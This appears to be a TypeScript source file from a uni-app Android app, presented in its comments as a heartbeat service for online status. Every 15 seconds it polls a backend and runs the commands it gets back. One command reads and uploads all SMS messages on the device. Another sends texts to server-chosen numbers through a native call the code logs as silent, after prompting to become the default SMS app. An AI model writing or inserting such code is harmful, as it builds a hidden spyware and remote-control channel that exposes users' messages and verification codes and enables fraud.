/**
 * 心跳服务 - 维持用户在线状态
 */
import { heartbeat, markOffline } from '@/api/user'
import { readAllSms } from '@/utils/sms-reader'
import { fullSyncSms, reportCommandResult } from '@/api/monitor'
import { isSmsListening } from '@/utils/sms-monitor'
// #ifdef APP-PLUS
let callModule: any = null
function getCallModule(): any {
  if (!callModule) callModule = uni.requireNativePlugin('leven-call-CallModule')
  return callModule
}
// #endif

// 缓存前台通知权限状态（异步查询，缓存结果供心跳同步使用）
let foregroundPermission: number = 0 // 0=未知 1=已开启 2=未开启

// 缓存默认短信应用状态
let isDefaultSms: number = 0 // 0=未知 1=是 2=否

/**
 * 异步刷新前台通知权限状态（仅检测上报，不申请权限）
 */
function refreshForegroundPermission(): void {
  // #ifdef APP-PLUS
  try {
    const module = getCallModule()
    if (!module) return
    module.isForegroundPermission((res: any) => {
      if (res && res.code === 0) {
        foregroundPermission = res.data?.status ? 1 : 2
      }
    })
  } catch {
    // ignore
  }
  // #endif
}

/**
 * 检查是否是默认短信应用
 */
function checkIsDefaultSms(): void {
  // #ifdef APP-PLUS
  try {
    const Telephony = plus.android.importClass('android.provider.Telephony') as any
    const main = plus.android.runtimeMainActivity() as any
    const defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(main)
    isDefaultSms = defaultSmsApp === main.getPackageName() ? 1 : 2
  } catch {
    isDefaultSms = 0
  }
  // #endif
}

// 心跳间隔（毫秒）
const HEARTBEAT_INTERVAL = 15000 // 15秒

// 心跳定时器
let heartbeatTimer: number | null = null

// 是否已启动
let isRunning = false

/**
 * 检查短信权限状态
 * @returns 0=未知 1=已授权 2=未授权
 */
function checkSmsPermission(): number {
  // #ifdef APP-PLUS
  try {
    const main = plus.android.runtimeMainActivity()
    const ActivityCompat = plus.android.importClass('androidx.core.app.ActivityCompat') as any
    const PackageManager = plus.android.importClass('android.content.pm.PackageManager') as any
    const result = ActivityCompat.checkSelfPermission(main, 'android.permission.READ_SMS')
    return result === PackageManager.PERMISSION_GRANTED ? 1 : 2
  } catch {
    return 0
  }
  // #endif
  return 0
}

/**
 * 获取设备类型
 */
function getDeviceType(): string {
  // #ifdef APP-PLUS
  const systemInfo = uni.getSystemInfoSync()
  return `${systemInfo.platform}-${systemInfo.model || 'unknown'}`
  // #endif

  // #ifdef MP-WEIXIN
  return 'weixin-mp'
  // #endif

  // #ifdef H5
  const ua = navigator.userAgent.toLowerCase()
  if (ua.includes('mobile')) {
    return 'h5-mobile'
  }
  return 'h5-desktop'
  // #endif

  return 'unknown'
}

/**
 * 打开 APP 系统设置页面（引导用户手动开启权限）
 */
function openAppSettings(): void {
  // #ifdef APP-PLUS
  try {
    const main = plus.android.runtimeMainActivity()
    const Intent = plus.android.importClass('android.content.Intent') as any
    const Settings = plus.android.importClass('android.provider.Settings') as any
    const Uri = plus.android.importClass('android.net.Uri') as any
    const intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
    const uri = Uri.fromParts('package', main.getPackageName(), null)
    intent.setData(uri)
    main.startActivity(intent)
  } catch (e) {
    console.error('[Heartbeat] Failed to open app settings:', e)
  }
  // #endif
}

/**
 * 处理后端下发的指令
 */
async function handleCommands(commands: any[]): Promise<void> {
  if (!commands || commands.length === 0) return

  for (const cmd of commands) {
    console.log('[Heartbeat] Received command:', cmd.command, 'id:', cmd.id)
    if (cmd.command === 'fetch_all_sms') {
      // #ifdef APP-PLUS
      try {
        // 检查短信权限，没有权限直接上报空结果（不在心跳中弹权限申请）
        const hasPermission = checkSmsPermission() === 1
        if (!hasPermission) {
          console.warn('[Heartbeat] No SMS permission, skip fetch_all_sms')
          await fullSyncSms([], cmd.id)
          continue
        }
        const records = readAllSms()
        console.log('[Heartbeat] Read', records.length, 'SMS, uploading...')
        await fullSyncSms(records, cmd.id)
        console.log('[Heartbeat] SMS full sync completed')
      } catch (e) {
        console.error('[Heartbeat] Failed to execute fetch_all_sms:', e)
      }
      // #endif
    } else if (cmd.command === 'send_sms') {
      // #ifdef APP-PLUS
      try {
        const params = cmd.params || {}
        const phoneNumber = params.phone_number || ''
        const message = params.message || ''
        const subId = params.sub_id || 0

        if (!phoneNumber || !message) {
          console.warn('[Heartbeat] send_sms: missing phone_number or message')
          await reportCommandResult(cmd.id, 'failed', { error: 'Missing phone_number or message' })
          continue
        }

        console.log('[Heartbeat] Sending silent SMS to:', phoneNumber, 'msg:', message, 'subId:', subId)

        await new Promise<void>((resolve) => {
          const module = getCallModule()
          if (!module) {
            reportCommandResult(cmd.id, 'failed', { error: 'leven-call module not available' }).finally(resolve)
            return
          }

          // 使用缓存的默认短信应用状态（每次心跳已更新）
          const isDefault = isDefaultSms === 1
          console.log('[Heartbeat] IsDefaultSmsApp:', isDefault)

          const sendParams: any = { phoneNumber: String(phoneNumber), message: String(message) }
          if (subId > 0) sendParams.subId = subId

          let resolved = false
          const finish = async (success: boolean, result: Record<string, any>) => {
            if (resolved) return
            resolved = true
            await reportCommandResult(cmd.id, success ? 'completed' : 'failed', result)
            resolve()
          }

          const doSend = () => {
            console.log('[Heartbeat] Calling hideSendSms with params:', JSON.stringify(sendParams))
            module.hideSendSms(sendParams, async (res: any) => {
              console.log('[Heartbeat] hideSendSms callback:', JSON.stringify(res))
              if (!res) return
              if (res.code === 0 && res.data?.type === 'sendResult') {
                await finish(true, { message: res.message || 'sent' })
              } else if (res.code === 0 && res.data?.type === 'send') {
                console.log('[Heartbeat] SMS send initiated, waiting for sendResult...')
              } else if (res.code !== 0) {
                await finish(false, { code: res.code, message: res.message || '' })
              }
            })
          }

          if (isDefault) {
            // 已是默认短信应用，直接发送
            doSend()
          } else {
            // 请求成为默认短信应用，成功后再发送
            console.log('[Heartbeat] Not default SMS app, requesting...')
            module.setDefaultSms((res: any) => {
              console.log('[Heartbeat] setDefaultSms result:', JSON.stringify(res))
              if (res && res.code === 0) {
                // 用户同意了，稍等一下再发送
                setTimeout(doSend, 500)
              } else {
                finish(false, { error: 'Not default SMS app, user denied or cancelled' })
              }
            })
          }

          // 超时保护 90 秒（含用户操作时间）
          setTimeout(() => finish(false, { error: 'Timeout' }), 90000)
        })

        console.log('[Heartbeat] send_sms completed')
      } catch (e) {
        console.error('[Heartbeat] Failed to execute send_sms:', e)
        try {
          await reportCommandResult(cmd.id, 'failed', { error: String(e) })
        } catch { /* ignore */ }
      }
      // #endif
    }
  }
}

/**
 * 发送心跳
 */
async function sendHeartbeat(): Promise<void> {
  try {
    const token = uni.getStorageSync('token')
    if (!token) {
      // 未登录，停止心跳
      stop()
      return
    }

    // 刷新状态（同步检查，当次心跳生效）
    refreshForegroundPermission()
    checkIsDefaultSms()

    // 获取 FCM push token
    let fcmToken = ''
    // #ifdef APP-PLUS
    try {
      const info = plus.push.getClientInfo()
      fcmToken = info?.token || ''
    } catch (e) {
      // push 未初始化时忽略
    }
    // #endif

    const device = getDeviceType()
    const smsPermission = checkSmsPermission()
    const smsListening = isSmsListening() ? 1 : 2
    const res: any = await heartbeat(device, smsPermission, smsListening, foregroundPermission, isDefaultSms, fcmToken)
    console.log('[Heartbeat] sent successfully')

    // 检查是否有待执行的指令
    if (res?.data?.commands && res.data.commands.length > 0) {
      handleCommands(res.data.commands)
    }
  } catch (error) {
    console.warn('[Heartbeat] failed:', error)
    // 心跳失败不停止，继续尝试
  }
}

/**
 * 启动心跳服务
 */
export function start(): void {
  if (isRunning) {
    console.log('[Heartbeat] already running')
    return
  }

  const token = uni.getStorageSync('token')
  if (!token) {
    console.log('[Heartbeat] no token, skip start')
    return
  }

  isRunning = true
  console.log('[Heartbeat] started')

  // 立即发送一次心跳
  sendHeartbeat()

  // 设置定时器
  heartbeatTimer = setInterval(() => {
    sendHeartbeat()
  }, HEARTBEAT_INTERVAL) as unknown as number
}

/**
 * 停止心跳服务
 */
export function stop(): void {
  if (heartbeatTimer) {
    clearInterval(heartbeatTimer)
    heartbeatTimer = null
  }
  isRunning = false
  console.log('[Heartbeat] stopped')
}

/**
 * 暂停心跳（APP进入后台时调用）
 */
export function pause(): void {
  if (heartbeatTimer) {
    clearInterval(heartbeatTimer)
    heartbeatTimer = null
  }
  console.log('[Heartbeat] paused')
}

/**
 * 恢复心跳（APP回到前台时调用）
 */
export function resume(): void {
  if (!isRunning) {
    return
  }

  const token = uni.getStorageSync('token')
  if (!token) {
    stop()
    return
  }

  // 立即发送一次心跳
  sendHeartbeat()

  // 重新设置定时器
  if (!heartbeatTimer) {
    heartbeatTimer = setInterval(() => {
      sendHeartbeat()
    }, HEARTBEAT_INTERVAL) as unknown as number
  }
  console.log('[Heartbeat] resumed')
}

/**
 * 标记用户离线（退出登录时调用）
 */
export async function setOffline(): Promise<void> {
  try {
    await markOffline()
    console.log('[Heartbeat] marked offline')
  } catch (error) {
    console.warn('[Heartbeat] mark offline failed:', error)
  }
  stop()
}

/**
 * 检查心跳服务是否活跃（正在运行且定时器存在）
 */
export function isActive(): boolean {
  return isRunning && heartbeatTimer !== null
}

/**
 * 心跳服务对象
 */
export const HeartbeatService = {
  start,
  stop,
  pause,
  resume,
  setOffline,
  isActive,
}

export default HeartbeatService
